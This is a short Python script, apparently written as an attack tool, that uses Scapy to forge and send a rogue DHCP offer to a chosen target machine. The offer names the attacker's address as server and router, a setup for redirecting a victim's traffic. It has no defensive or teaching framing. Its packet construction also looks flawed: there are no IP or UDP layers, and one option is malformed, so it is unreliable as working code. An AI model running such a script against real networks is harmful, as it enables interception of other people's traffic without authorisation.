from scapy.all import DHCP, BOOTP, Ether, IP, sendp
# Written by Lithiokride

# Parameters
target_mac = "00:11:22:33:44:55"  # Target MAC address
target_ip = "192.168.1.10"         # Target IP address
server_ip = "192.168.1.1"          # Rogue DHCP server IP
gateway_ip = "192.168.1.1"         # Gateway IP

# Create the Ethernet layer
eth = Ether(dst=target_mac)

# Create the BOOTP layer
bootp = BOOTP(op=2,  # Boot reply
              hwtype=1,  # Ethernet
              hlen=6,     # Hardware length
              hops=0,
              xid=0x39,   # Transaction ID (can be any number)
              secs=0,
              flags=0,
              ciaddr=0,   # Client IP address
              yiaddr=target_ip,  # Your IP address
              siaddr=server_ip,   # DHCP server IP
              giaddr=gateway_ip,  # Gateway IP
              chaddr=bytes.fromhex(target_mac.replace(":", "")))  # Target MAC in byte form

# Create the DHCP layer
dhcp = DHCP(options=[("message-type", "offer"),
                     ("server_id", server_ip),
                     ("lease_time", 3600),
                     ("subnet_mask", "255.255.255.0"),
                     ("router", gateway_ip),
                     ("end")])

# Construct the packet
rogue_dhcp_offer = eth / bootp / dhcp

# Send the rogue DHCP offer
sendp(rogue_dhcp_offer)

print("Rogue DHCP Offer packet sent.")
